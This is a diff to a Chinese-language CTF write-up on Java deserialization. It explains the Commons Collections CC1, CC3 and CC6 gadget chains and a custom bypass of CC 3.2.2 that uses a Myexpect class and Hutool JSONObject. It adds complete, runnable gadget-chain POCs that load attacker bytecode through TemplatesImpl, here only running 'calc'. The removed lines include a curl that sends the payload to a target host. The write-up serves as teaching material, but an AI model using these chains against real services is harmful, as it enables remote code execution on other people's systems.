@@ -4,10 +4,14 @@
 
 - [题目分析](#题目分析)
 - [漏洞分析](#漏洞分析)
+- [CC链基础知识](#cc链基础知识)
+  - [CC1链原理](#cc1链原理)
+  - [CC3链原理](#cc3链原理)
+  - [CC6链原理](#cc6链原理)
 - [解题思路](#解题思路)
 - [完整POC实现](#完整poc实现)
 - [关键机制解析](#关键机制解析)
-- [CC链演变分析](#cc链演变分析)
+- [反序列化链拼接原理](#反序列化链拼接原理)
 
 ---
 
@@ -99,6 +103,222 @@ Commons Collections 3.2.2 的安全限制：
 
 ---
 
+## CC链基础知识
+
+本题目是基于经典的CC1、CC3和CC6链进行改造的CTF题目。理解原始链和改造思路是解题关键。
+
+### CC1链原理
+
+#### 核心组件
+
+```java
+// 使用 TransformedMap 在 setValue 时触发
+Map innerMap = new HashMap();
+innerMap.put("value", "test");
+Transformer[] transformers = new Transformer[]{
+    new ConstantTransformer(Runtime.class),
+    new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
+    new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
+    new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
+};
+Map transformedMap = TransformedMap.decorate(innerMap, null, new ChainedTransformer(transformers));
+
+// 使用 AnnotationInvocationHandler 触发
+Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
+Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class);
+construct.setAccessible(true);
+Object obj = construct.newInstance(Retention.class, transformedMap);
+```
+
+#### 调用链
+
+```
+AnnotationInvocationHandler.readObject()
+  → memberValues.entrySet()遍历
+  → TransformedMap.setValue()  // 当key="value"时触发
+    → ChainedTransformer.transform()
+      → ConstantTransformer → 返回Runtime.class
+      → InvokerTransformer链式调用
+        → Runtime.getRuntime().exec() → RCE
+```
+
+#### 失效原因
+
+**JDK 8u71+限制**：
+
+```java
+// AnnotationInvocationHandler.readObject() 在 JDK 8u71+ 中增加了类型检查
+private void readObject(ObjectInputStream s) {
+    // ...
+    AnnotationType annotationType = null;
+    try {
+        annotationType = AnnotationType.getInstance(type);
+    } catch(IllegalArgumentException e) {
+        throw new java.io.InvalidObjectException("Non-annotation type in annotation serial stream");
+    }
+    
+    Map<String, Class<?>> memberTypes = annotationType.memberTypes();
+    for (Map.Entry<String, Object> memberValue : memberValues.entrySet()) {
+        String name = memberValue.getKey();
+        Class<?> memberType = memberTypes.get(name);
+        if (memberType != null) {  // ❌ 必须是注解的成员
+            Object value = memberValue.getValue();
+            if (!(memberType.isInstance(value) || value instanceof ExceptionProxy)) {
+                memberValue.setValue(  // 只有这里会调用setValue
+                    new AnnotationTypeMismatchExceptionProxy(
+                        value.getClass() + "[" + value + "]"));
+            }
+        }
+    }
+}
+```
+
+- 只有当key是注解的合法成员时才会触发setValue
+- @Retention注解只有value()成员，但value类型是RetentionPolicy枚举，类型不匹配时才会setValue
+- 高版本JDK对此进行了严格限制，导致CC1失效
+
+**CC 3.2.2限制**：
+
+```java
+// InvokerTransformer.readObject()
+private void readObject(ObjectInputStream is) {
+    FunctorUtils.checkUnsafeSerialization(InvokerTransformer.class);  // ❌ 抛异常
+}
+```
+
+---
+
+### CC3链原理
+
+#### 核心组件
+
+```java
+// 使用 InstantiateTransformer 调用构造器
+Transformer[] transformers = new Transformer[]{
+    new ConstantTransformer(TrAXFilter.class),
+    new InstantiateTransformer(
+        new Class[]{Templates.class},
+        new Object[]{templates}
+    )
+};
+
+// 使用动态代理触发
+Map innerMap = new HashMap();
+Map lazyMap = LazyMap.decorate(innerMap, new ChainedTransformer(transformers));
+
+// AnnotationInvocationHandler作为InvocationHandler
+Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
+Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class);
+construct.setAccessible(true);
+InvocationHandler handler = (InvocationHandler) construct.newInstance(Retention.class, lazyMap);
+
+// 创建代理对象
+Map proxyMap = (Map) Proxy.newProxyInstance(
+    Map.class.getClassLoader(),
+    new Class[]{Map.class},
+    handler
+);
+
+// 再次封装
+Object obj = construct.newInstance(Retention.class, proxyMap);
+```
+
+#### 调用链
+
+```
+AnnotationInvocationHandler.readObject()
+  → memberValues.entrySet()  // memberValues是proxyMap
+    → 代理对象方法调用
+      → AnnotationInvocationHandler.invoke()
+        → LazyMap.get()
+          → ChainedTransformer.transform()
+            → ConstantTransformer → 返回TrAXFilter.class
+            → InstantiateTransformer.transform()
+              → Constructor.newInstance(templates)  // 反射调用构造器
+              → new TrAXFilter(templates)
+                → templates.newTransformer() → RCE
+```
+
+#### CC 3.2.2失败原因
+
+**CC 3.2.2限制**：
+
+```java
+// InstantiateTransformer.readObject()
+private void readObject(ObjectInputStream is) {
+    FunctorUtils.checkUnsafeSerialization(InstantiateTransformer.class);  // ❌ 抛异常
+}
+```
+
+**JDK版本限制**：
+
+虽然CC3使用动态代理绕过了JDK 8u71+对TransformedMap的限制，但在高版本JDK中，AnnotationInvocationHandler的invoke方法也被修改，导致LazyMap.get()无法被触发。本题目使用的是JDK 1.8.0_202，理论上CC3的触发方式仍然可用，但主要问题是InstantiateTransformer被禁用。
+
+---
+
+### CC6链原理
+
+#### 核心组件
+
+```java
+// 使用 InvokerTransformer 直接反射调用方法
+Transformer[] transformers = new Transformer[]{
+    new ConstantTransformer(Runtime.class),
+    new InvokerTransformer("getMethod", ...),    // 获取方法
+    new InvokerTransformer("invoke", ...),       // 调用方法
+    new InvokerTransformer("exec", ...)          // 执行命令
+};
+
+// 使用 HashMap + TiedMapEntry + LazyMap 触发
+HashMap hashMap = new HashMap();
+TiedMapEntry entry = new TiedMapEntry(lazyMap, "key");
+hashMap.put(entry, "value");
+```
+
+#### 调用链
+
+```
+HashMap.readObject()
+  → hash(key)
+    → TiedMapEntry.hashCode()
+      → getValue()
+        → LazyMap.get(key)
+          → ChainedTransformer.transform()
+            → InvokerTransformer链式调用 → Runtime.exec() → RCE
+```
+
+#### CC 3.2.2失败原因
+
+```java
+// InvokerTransformer.readObject()
+private void readObject(ObjectInputStream is) {
+    FunctorUtils.checkUnsafeSerialization(InvokerTransformer.class);  // ❌ 抛异常
+}
+```
+
+---
+
+### CC1/CC3/CC6核心区别对比表
+
+| 特性 | CC1 | CC3 | CC6 |
+|------|-----|-----|-----|
+| **Commons Collections版本** | ≤3.2.1 | ≤3.2.1 | ≤3.2.1 |
+| **JDK版本限制** | ≤JDK 8u71 | 8u71+可用（部分版本） | 无限制 |
+| **触发类** | AnnotationInvocationHandler | AnnotationInvocationHandler | HashMap |
+| **触发方式** | TransformedMap.setValue() | 动态代理 + LazyMap.get() | TiedMapEntry.hashCode() → LazyMap.get() |
+| **核心Transformer** | InvokerTransformer | InstantiateTransformer | InvokerTransformer |
+| **攻击目标** | Runtime.exec() | TrAXFilter → TemplatesImpl | Runtime.exec() |
+| **优点** | 简单直接 | 绕过JDK 8u71限制，字节码加载隐蔽 | JDK兼容性最好 |
+| **缺点** | JDK 8u71+失效 | 高版本JDK可能失效 | 直接调用Runtime易被拦截 |
+| **失效原因** | memberValues类型检查 | InstantiateTransformer被禁用 | InvokerTransformer被禁用 |
+
+**关键发现**：
+
+- CC1 → CC3：为了绕过JDK 8u71+对TransformedMap的限制，改用动态代理触发LazyMap
+- CC3 → CC6：为了彻底摆脱AnnotationInvocationHandler的JDK版本限制，改用HashMap触发
+
+---
+
 ## 解题思路
 
 ### 核心思路
@@ -129,197 +349,92 @@ HashMap.readObject()
 
 ---
 
-### MyPOC.java (题目答案)
+## 完整POC实现
 
 ```java
-publiPOC实现
-
-### MyPOC.java节码（执行命令）
+public class MyPOC {
+    public static void main(String[] args) throws Exception {
+        // 准备TemplatesImpl字节码
         byte[] bytes = getTemplates();
         TemplatesImpl templates = new TemplatesImpl();
         setFieldValue(templates, "_name", "1");
         setFieldValue(templates, "_bytecodes", new byte[][]{bytes});
         
-        // 步骤2: 配置Myexpect调用TrAXFilter构造器
+        // 配置Myexpect调用TrAXFilter构造器
         Myexpect myexpect = new Myexpect();
-        myexpect.setTargetclass(TrAXFilter.class);           // 目标类
-        myexpect.setTypeparam(new Class[]{Templates.class}); // 参数类型
-        myexpect.setTypearg(new Object[]{templates});        // 参数值
+        myexpect.setTargetclass(TrAXFilter.class);
+        myexpect.setTypeparam(new Class[]{Templates.class});
+        myexpect.setTypearg(new Object[]{templates});
         
-        // 步骤3: 构造LazyMap触发链
+        // 构造LazyMap触发链
         JSONObject jsonObject = new JSONObject();
         ConstantTransformer transformer = new ConstantTransformer(1);
         LazyMap lazyMap = (LazyMap) LazyMap.decorate(jsonObject, transformer);
         TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "111");
         
-        // 步骤4: 利用HashMap触发
+        // HashMap触发 + 时序控制
         HashMap hashMap = new HashMap();
         hashMap.put(tiedMapEntry, "1");
-        jsonObject.remove("111");  // 确保LazyMap.get()会调用transform
-        
-        // 步骤5: 替换ConstantTransformer的返回值为Myexpect
+        jsonObject.remove("111");  // 确保反序列化时触发
         setFieldValue(transformer, "iConstant", myexpect);
         
-        // 步骤6: 序列化并生成payload
+        // 生成payload
         byte[] serialize = serialize(hashMap);
         System.out.println(Base64.getEncoder().encodeToString(serialize));
     }
     
-    // 生成恶意字节码
     public static byte[] getTemplates() throws Exception {
         ClassPool pool = ClassPool.getDefault();
         CtClass template = pool.makeClass("Test");
         template.setSuperclass(pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet"));
-        String block = "Runtime.getRuntime().exec(\"bash -c {echo,b3BlbiAtYSBDYWxjdWxhdG9y}|{base64,-d}|{bash,-i}\");";
+        String block = "Runtime.getRuntime().exec(\"calc\");";
         template.makeClassInitializer().insertBefore(block);
         return template.toBytecode();
     }
 }
 ```
 
-### POC关键点解析
-
-#### 1. 时序控制
-
-```java
-hashMap.put(tiedMapEntry, "1");   // 构造时触发，避免污染序列化数据
-jsonObject.remove("111");          // 清除key，确保反序列化时触发transform
-setFieldValue(transformer, "iConstant", myexpect);  // 替换返回值
-```
-
-#### 2. 使用方法
-
-```bash
-javac -cp "lib/*:src" src/com/app/MyPOC.java
-java -cp "lib/*:src" com.app.MyPOC
-curl "http://target:8888/?bugstr=<base64_payload>"
-```
-
 ---
 
 ## 关键机制解析
 
-### 1. JSONObject.put 为什么能触发 getAnyexcept()？
+### 1. JSONObject.put 触发 getAnyexcept()
 
-这是本题的核心突破点。
-
-#### Java Bean 规范
-
-```java
-public class Myexpect extends Exception {
-    public Object getAnyexcept() throws Exception { ... }  // ✅ 符合getter规范
-    // 特征：以"get"开头、无参数、有返回值
-}
-```
-
-#### Hutool JSON序列化机制
-
-```java
-// JSONObject.put() 内部逻辑
-public JSONObject put(String key, Object value) {
-    if (value是自定义对象) {
-        // 调用BeanUtil.beanToMap()
-        // 1. 反射获取所有public方法
-        // 2. 过滤出getter方法 (method.getName().startsWith("get"))
-        // 3. 逐个调用getter获取属性值
-        // 4. getAnyexcept()也会被调用！✅
-    }
-    return this;
-}
-```
-
-#### 触发时机
+**核心原理**：Hutool JSONObject.put() 会调用 BeanUtil.beanToMap()，自动反射调用对象的所有getter方法。
 
 ```java
 LazyMap.get("111")
-  → transformer.transform("111")     // 返回Myexpect对象
-    → jsonObject.put("111", myexpect)  // ← 触发点
-      → BeanUtil.beanToMap(myexpect)
-        → getAnyexcept() 被调用！✅
+  → transformer.transform("111")  // 返回Myexpect对象
+    → jsonObject.put("111", myexpect)  // JSONObject序列化
+      → getAnyexcept() 被自动调用！
 ```
 
-**关键点**：使用 JSONObject 作为 LazyMap 的底层 Map
-
-- 普通HashMap不会触发getter
-- JSONObject.put 会序列化对象，自动调用所有getter
-
----
+**关键**：使用JSONObject而非普通HashMap作为LazyMap底层Map。
 
 ### 2. jsonObject.remove("111") 的作用
 
-#### 嵌套结构
+确保反序列化时触发transform：
 
-```
-HashMap
-  └─ key: TiedMapEntry
-       └─ map: LazyMap
-            └─ map: JSONObject (底层存储)
-```
+- 构造时：`hashMap.put()` → `jsonObject.put("111", 1)`
+- 清理：`jsonObject.remove("111")`
+- 反序列化：`lazyMap.get("111")` → `!containsKey("111")` → 调用`transform()`
 
-#### 执行时序
+**不remove则**：LazyMap直接返回已存在值，不触发transform。
 
-**构造阶段**：
+### 3. 为什么选择 TrAXFilter + TemplatesImpl
 
-```java
-hashMap.put(tiedMapEntry, "1");  
-// → lazyMap.get("111")
-// → jsonObject.put("111", 1)  // jsonObject现在包含"111"
-```
+**Myexpect限制**：只能调用构造器，不能调用普通方法。
 
-**清理阶段**：
-
-```java
-jsonObject.remove("111");  // 从JSONObject移除"111"
-```
-
-**反序列化阶段**：
-
-```java
-// 因为jsonObject不包含"111"
-lazyMap.get("111")
-  → !jsonObject.containsKey("111")  // true
-  → transformer.transform("111")     // 会被调用
-```
-
-**如果不remove**：`LazyMap.get()` 直接返回已存在的值，不会调用 `transform()`，攻击失败。
-
----
-
-### 3. 为什么选择 TrAXFilter + TemplatesImpl？
-
-#### Myexpect 的限制
-
-```java
-public Object getAnyexcept() throws Exception {
-    Constructor con = targetclass.getConstructor(typeparam);
-    return con.newInstance(typearg);  // 只能调用构造器
-}
-```
-
-#### Runtime.exec() 不可行
-
-```java
-public class Runtime {
-    private Runtime() {}  // 构造器private
-    public static Runtime getRuntime() { ... }  // 需要静态方法
-    public Process exec(String command) { ... }  // 需要方法调用
-}
-```
-
-- Myexpect只能调用构造器，无法调用普通方法
-- Runtime构造器是private的
-
-#### TrAXFilter 完美适配
+**TrAXFilter优势**：
 
 ```java
 public TrAXFilter(Templates templates) {
-    _transformer = templates.newTransformer();  // 构造器中自动触发！
+    _transformer = templates.newTransformer();  // 构造器中自动触发
 }
 ```
 
-- 构造器是public的 ✅
-- 构造器内部自动调用 `templates.newTransformer()` ✅
-- 触发 TemplatesImpl 字节码加载 ✅
+- Runtime构造器是private的 ❌
+- TrAXFilter构造器是public的，且内部自动调用newTransformer() ✅
 
 ---
 
@@ -339,12 +454,12 @@ public TrAXFilter(Templates templates) {
 
 #### 1. 触发器（Trigger）- 决定何时执行
 
-| 触发器 | 入口方法 | JDK要求 | 稳定性 |
+| 触发器 | 入口方法 | JDK要求 |
 |--------|---------|---------|--------|
-| **HashMap** | readObject() → hash() → hashCode() | 任意版本 | ⭐⭐⭐⭐⭐ 最稳定 |
-| **PriorityQueue** | readObject() → heapify() → compare() | 任意版本 | ⭐⭐⭐⭐ |
-| **BadAttributeValueExpException** | readObject() → toString() | 任意版本 | ⭐⭐⭐ |
-| **AnnotationInvocationHandler** | readObject() → entrySet() → setValue() | ≤JDK 8u71 | ⭐⭐ JDK限制 |
+| **HashMap** | readObject() → hash() → hashCode() | 任意版本 |
+| **PriorityQueue** | readObject() → heapify() → compare() | 任意版本 |
+| **BadAttributeValueExpException** | readObject() → toString() | 任意版本 |
+| **AnnotationInvocationHandler** | readObject() → entrySet() → setValue() | ≤JDK 8u71 |
 
 #### 2. 传递机制（Chain）- 如何传递到目标
 
@@ -435,13 +550,37 @@ LazyMap lazyMap = LazyMap.decorate(new HashMap(), new ChainedTransformer(transfo
 // → ChainedTransformer → Runtime.exec()
 ```
 
-#### 组合2：CC3 = TransformedMap触发 + InstantiateTransformer + TemplatesImpl
+#### 组合2：CC1 = TransformedMap触发 + InvokerTransformer + Runtime.exec()
 
 ```java
 // [触发器] AnnotationInvocationHandler + TransformedMap
 Map<String, Object> innerMap = new HashMap<>();
 innerMap.put("value", "test");
 Map transformedMap = TransformedMap.decorate(innerMap, null, chainedTransformer);
+
+// [传递机制] InvokerTransformer
+Transformer[] transformers = new Transformer[]{
+    new ConstantTransformer(Runtime.class),
+    new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
+    new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
+    new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
+};
+
+// [攻击目标] Runtime.exec()
+// 调用链：
+// AnnotationInvocationHandler.readObject() → TransformedMap.setValue()
+// → ChainedTransformer → InvokerTransformer链
+// → Runtime.getRuntime().exec() → RCE
+```
+
+#### 组合3：CC3 = 动态代理触发 + InstantiateTransformer + TemplatesImpl
+
+```java
+// [触发器] AnnotationInvocationHandler + 动态代理 + LazyMap
+Map innerMap = new HashMap();
+Map lazyMap = LazyMap.decorate(innerMap, chainedTransformer);
+InvocationHandler handler = (InvocationHandler) construct.newInstance(Retention.class, lazyMap);
+Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[]{Map.class}, handler);
 
 // [传递机制] InstantiateTransformer
 Transformer[] transformers = new Transformer[]{
@@ -454,37 +593,152 @@ Transformer[] transformers = new Transformer[]{
 
 // [攻击目标] TemplatesImpl字节码加载
 // 调用链：
-// AnnotationInvocationHandler.readObject() → TransformedMap.setValue()
-// → ChainedTransformer → InstantiateTransformer 
+// AnnotationInvocationHandler.readObject() → proxyMap.entrySet()
+// → 动态代理invoke() → LazyMap.get() → ChainedTransformer → InstantiateTransformer 
 // → new TrAXFilter(templates) → templates.newTransformer() → 字节码加载
 ```
 
-#### 组合3：CC6触发 + CC3攻击（本项目的CC6TriggerCC3Attack）
+#### 组合4：CC6触发 + CC3攻击（完整实现）
+
+这个组合结合了CC6的稳定触发和CC3的隐蔽攻击，是理论上的最优组合。
 
 ```java
-// [触发器] 借用CC6的HashMap触发（更稳定）
-HashMap hashMap = new HashMap();
-TiedMapEntry entry = new TiedMapEntry(lazyMap, "key");
+import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
+import javassist.ClassPool;
+import javassist.CtClass;
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InstantiateTransformer;
+import org.apache.commons.collections.keyvalue.TiedMapEntry;
+import org.apache.commons.collections.map.LazyMap;
 
-// [传递机制] InstantiateTransformer（CC3的）
-Transformer[] transformers = new Transformer[]{
-    new ConstantTransformer(TrAXFilter.class),
-    new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates})
-};
+import javax.xml.transform.Templates;
+import java.io.*;
+import java.lang.reflect.Field;
+import java.util.Base64;
+import java.util.HashMap;
+import java.util.Map;
 
-// [攻击目标] 借用CC3的TemplatesImpl（更隐蔽）
-// 调用链：
-// HashMap.readObject() ← CC6的触发
-//   → TiedMapEntry.hashCode()
-//   → LazyMap.get()
-//   → InstantiateTransformer ← CC3的传递
-//   → new TrAXFilter(templates) ← CC3的攻击目标
-//   → templates.newTransformer()
+public class CC6TriggerCC3Attack {
+    public static void main(String[] args) throws Exception {
+        // 1. 准备恶意字节码 - 使用TemplatesImpl
+        byte[] code = getEvilBytecode();
+        TemplatesImpl templates = new TemplatesImpl();
+        setFieldValue(templates, "_name", "HelloTemplatesImpl");
+        setFieldValue(templates, "_bytecodes", new byte[][]{code});
+        setFieldValue(templates, "_tfactory", null);
+
+        // 2. 构造Transformer链 - 使用CC3的InstantiateTransformer
+        Transformer[] transformers = new Transformer[]{
+            new ConstantTransformer(TrAXFilter.class),
+            new InstantiateTransformer(
+                new Class[]{Templates.class},
+                new Object[]{templates}
+            )
+        };
+        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
+
+        // 3. 构造LazyMap - 延迟触发
+        Map innerMap = new HashMap();
+        Map lazyMap = LazyMap.decorate(innerMap, chainedTransformer);
+
+        // 4. 使用CC6的HashMap触发方式
+        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "key");
+        HashMap hashMap = new HashMap();
+        hashMap.put(tiedMapEntry, "value");
+        
+        // 清理LazyMap，确保反序列化时重新触发
+        lazyMap.clear();
+
+        // 5. 序列化
+        byte[] payload = serialize(hashMap);
+        System.out.println("Payload (Base64): " + Base64.getEncoder().encodeToString(payload));
+
+        // 6. 反序列化测试
+        System.out.println("\n[*] 触发反序列化...");
+        deserialize(payload);
+    }
+
+    // 生成恶意字节码
+    public static byte[] getEvilBytecode() throws Exception {
+        ClassPool pool = ClassPool.getDefault();
+        CtClass ctClass = pool.makeClass("EvilClass");
+        ctClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));
+        
+        // 静态代码块中执行命令
+        String cmd = "Runtime.getRuntime().exec(\"calc\");";
+        ctClass.makeClassInitializer().insertBefore(cmd);
+        
+        return ctClass.toBytecode();
+    }
+
+    // 反射设置字段值
+    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
+        Field field = obj.getClass().getDeclaredField(fieldName);
+        field.setAccessible(true);
+        field.set(obj, value);
+    }
+
+    // 序列化
+    public static byte[] serialize(Object obj) throws Exception {
+        ByteArrayOutputStream baos = new ByteArrayOutputStream();
+        ObjectOutputStream oos = new ObjectOutputStream(baos);
+        oos.writeObject(obj);
+        oos.close();
+        return baos.toByteArray();
+    }
+
+    // 反序列化
+    public static Object deserialize(byte[] bytes) throws Exception {
+        ByteArrayInputStream bais = new ByteArrayInputStream(bytes);
+        ObjectInputStream ois = new ObjectInputStream(bais);
+        Object obj = ois.readObject();
+        ois.close();
+        return obj;
+    }
+}
+```
+
+**完整调用链**：
+
+```
+HashMap.readObject()                      ← CC6的触发器（最稳定）
+  ↓
+hash(tiedMapEntry)
+  ↓
+TiedMapEntry.hashCode()
+  ↓
+TiedMapEntry.getValue()
+  ↓
+LazyMap.get("key")
+  ↓
+ChainedTransformer.transform()
+  ↓
+ConstantTransformer.transform()           → 返回TrAXFilter.class
+  ↓
+InstantiateTransformer.transform()        ← CC3的传递机制
+  ↓
+new TrAXFilter(templates)                 ← CC3的攻击目标（构造器触发）
+  ↓
+templates.newTransformer()
+  ↓
+TemplatesImpl.getTransletInstance()
+  ↓
+TemplatesImpl.defineTransletClasses()
+  ↓
+加载恶意字节码 → 静态代码块执行 → RCE ✅
 ```
 
 **为什么这样组合？**
-- CC6的触发方式（HashMap）比CC3（AnnotationInvocationHandler）更稳定
-- CC3的攻击目标（TemplatesImpl）比CC6（Runtime.exec）更隐蔽
+
+- **稳定性**：HashMap触发不依赖JDK版本，比AnnotationInvocationHandler更通用
+- **隐蔽性**：TemplatesImpl字节码加载比Runtime.exec()更难被WAF/RASP检测
+- **绕过能力**：可绕过SecurityManager和部分安全防护
+
+**注意**：此组合在CC 3.2.1及以下版本可用，CC 3.2.2中InstantiateTransformer被禁用，需要用本题的Myexpect方式绕过。
 
 ---
 
@@ -554,364 +808,3 @@ deserialize(payload);  // 观察是否触发
 4. **创新绕过**：遇到限制时寻找替代方案
 
 **记住**：反序列化链不是固定的，可以像乐高积木一样自由拼接。关键是理解每个组件的功能和接口，然后根据环境约束进行创新组合。
-
----
-
-## 从CC3/CC6到MyPOC的改造思路
-
-本题目是基于经典的CC3和CC6链进行改造的CTF题目。理解原始链和改造思路是解题关键。
-
-### CC3链原理 (PureCC3POC.java)
-
-#### 核心组件
-
-```java
-// 使用 InstantiateTransformer 调用构造器
-Transformer[] transformers = new Transformer[]{
-    new ConstantTransformer(TrAXFilter.class),
-    new InstantiateTransformer(
-        new Class[]{Templates.class},
-        new Object[]{templates}
-    )
-};
-```
-
-#### 调用链
-
-```
-AnnotationInvocationHandler.readObject()
-  → TransformedMap.setValue()
-    → ChainedTransformer.transform()
-      → ConstantTransformer → 返回TrAXFilter.class
-      → InstantiateTransformer.transform()
-        → Constructor.newInstance(templates)  // 反射调用构造器
-        → new TrAXFilter(templates)
-          → templates.newTransformer() → RCE
-```
-
-#### CC 3.2.2失败原因
-
-```java
-// InstantiateTransformer.readObject()
-private void readObject(ObjectInputStream is) {
-    FunctorUtils.checkUnsafeSerialization(InstantiateTransformer.class);  // ❌ 抛异常
-}
-```
-
-还有AnnotationInvocationHandler在JDK 8u71+后失效，本题目使用的是jdk1.8.0_202
-
----
-
-### CC6链原理 (PureCC6POC.java)
-
-#### 核心组件
-
-```java
-// 使用 InvokerTransformer 直接反射调用方法
-Transformer[] transformers = new Transformer[]{
-    new ConstantTransformer(Runtime.class),
-    new InvokerTransformer("getMethod", ...),    // 获取方法
-    new InvokerTransformer("invoke", ...),       // 调用方法
-    new InvokerTransformer("exec", ...)          // 执行命令
-};
-
-// 使用 HashMap + TiedMapEntry + LazyMap 触发
-HashMap hashMap = new HashMap();
-TiedMapEntry entry = new TiedMapEntry(lazyMap, "key");
-hashMap.put(entry, "value");
-```
-
-#### 调用链
-
-```
-HashMap.readObject()
-  → hash(key)
-    → TiedMapEntry.hashCode()
-      → getValue()
-        → LazyMap.get(key)
-          → ChainedTransformer.transform()
-            → InvokerTransformer链式调用 → Runtime.exec() → RCE
-```
-
-#### CC 3.2.2失败原因
-
-```java
-// InvokerTransformer.readObject()
-private void readObject(ObjectInputStream is) {
-    FunctorUtils.checkUnsafeSerialization(InvokerTransformer.class);  // ❌ 抛异常
-}
-```
-
----
-
-### MyPOC的改造思路
-
-#### 问题分析
-
-在CC 3.2.2中，两个关键Transformer被禁用：
-
-- ❌ `InstantiateTransformer` - 不能用来反射调用构造器
-- ❌ `InvokerTransformer` - 不能用来反射调用方法
-- ✅ `ConstantTransformer` - 只能返回常量，看似无用
-
-#### 改造策略
-
-**借鉴CC6的触发方式 + 借鉴CC3的攻击目标 + 创新突破点**
-
-| 方面 | CC3 | CC6 | MyPOC (改造版) |
-|------|-----|-----|---------------|
-| **触发器** | AnnotationInvocationHandler + TransformedMap | HashMap + TiedMapEntry + LazyMap | ✅ 采用CC6（更稳定） |
-| **攻击目标** | TrAXFilter构造器 → TemplatesImpl | Runtime.exec() | ✅ 采用CC3（绕过安全管理器） |
-| **核心Transformer** | InstantiateTransformer | InvokerTransformer | ❌ 都被禁用 |
-| **突破方法** | - | - | ✅ Myexpect + JSONObject |
-
-#### 改造步骤详解
-
-**步骤1: 选择触发链 - 借鉴CC6**
-
-```java
-// MyPOC采用CC6的触发方式（更稳定，JDK通用）
-HashMap hashMap = new HashMap();
-TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "111");
-hashMap.put(tiedMapEntry, "1");
-```
-
-✅ **原因**：HashMap.readObject()触发比AnnotationInvocationHandler更稳定
-
-**步骤2: 选择攻击目标 - 借鉴CC3**
-
-```java
-// 目标：调用 new TrAXFilter(templates)
-Myexpect myexpect = new Myexpect();
-myexpect.setTargetclass(TrAXFilter.class);
-myexpect.setTypeparam(new Class[]{Templates.class});
-myexpect.setTypearg(new Object[]{templates});
-```
-
-✅ **原因**：TemplatesImpl方式不依赖SecurityManager，更通用
-
-**步骤3: 替换危险Transformer - 关键创新**
-
-传统方法（已失效）：
-
-```java
-❌ new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates})
-   // InstantiateTransformer被禁用
-```
-
-改造方法（绕过）：
-
-```java
-// 1. 使用Myexpect替代InstantiateTransformer的功能
-public Object getAnyexcept() throws Exception {
-    Constructor con = targetclass.getConstructor(typeparam);
-    return con.newInstance(typearg);  // 同样能反射调用构造器！
-}
-
-// 2. 使用ConstantTransformer返回Myexpect对象
-ConstantTransformer transformer = new ConstantTransformer(1);
-setFieldValue(transformer, "iConstant", myexpect);  // 返回自定义对象
-
-// 3. 触发getAnyexcept() - 利用JSON序列化
-```
-
-**步骤4: 触发getAnyexcept() - 最巧妙的创新**
-
-问题：`ConstantTransformer`只是返回对象，如何调用`getAnyexcept()`？
-
-解决方案：
-
-```java
-// 使用JSONObject作为LazyMap的底层Map
-JSONObject jsonObject = new JSONObject();
-LazyMap lazyMap = LazyMap.decorate(jsonObject, transformer);
-
-// 当LazyMap.get()触发时：
-// 1. transformer.transform() 返回 myexpect对象
-// 2. jsonObject.put(key, myexpect)  ← 关键！
-// 3. JSONObject序列化myexpect时会调用所有getter
-// 4. getAnyexcept()被自动调用！
-```
-
-#### 完整对比
-
-```java
-// ========== CC3 (失效) ==========
-TransformedMap.setValue()
-  → InstantiateTransformer.transform()  ❌ 被禁用
-    → new TrAXFilter(templates)
-
-// ========== CC6 (失效) ==========
-LazyMap.get()
-  → InvokerTransformer.transform()  ❌ 被禁用
-    → Runtime.exec()
-
-// ========== MyPOC (成功) ==========
-LazyMap.get()
-  → ConstantTransformer.transform()  ✅ 未被禁用
-    → 返回 Myexpect对象
-      → JSONObject.put(key, myexpect)
-        → 触发JSON序列化
-          → 调用 getAnyexcept()  ✅ 自定义方法，不受限制
-            → Constructor.newInstance()
-              → new TrAXFilter(templates)
-                → templates.newTransformer() → RCE ✅
-```
-
----
-
-### 改造要点总结
-
-#### 1. 触发方式：CC6 > CC3
-
-- CC3的`AnnotationInvocationHandler`在JDK 8u71+后对memberValues类型进行安全检查而失效
-- CC6的`HashMap + TiedMapEntry`更通用，能适应高版本JDK
-
-```
-HashMap.readObject()
-  → hash(key)  
-  → TiedMapEntry.hashCode()
-  → TiedMapEntry.getValue()
-  → LazyMap.get(key)
-  → transform(key)
-```
-
-#### 2. 攻击目标：CC3 > CC6
-
-- CC6直接调用`Runtime.exec()`容易被SecurityManager拦截，并且题目中使用的Myexpect只能调用构造器，不能调用普通方法。
-- CC3的`TemplatesImpl`字节码加载更隐蔽
-
-**为什么不能直接用Runtime.exec()？**
-
-有人可能会问：既然Myexpect能反射调用构造器，为什么不直接调用Runtime.exec()，而要用TemplatesImpl？
-
-原因如下：
-
-1. **Myexpect的限制**：
-
-```java
-public Object getAnyexcept() throws Exception {
-    Constructor con = targetclass.getConstructor(typeparam);
-    return con.newInstance(typearg);  // 只能调用构造器！
-}
-```
-
-Myexpect只能调用构造器，不能调用普通方法。
-
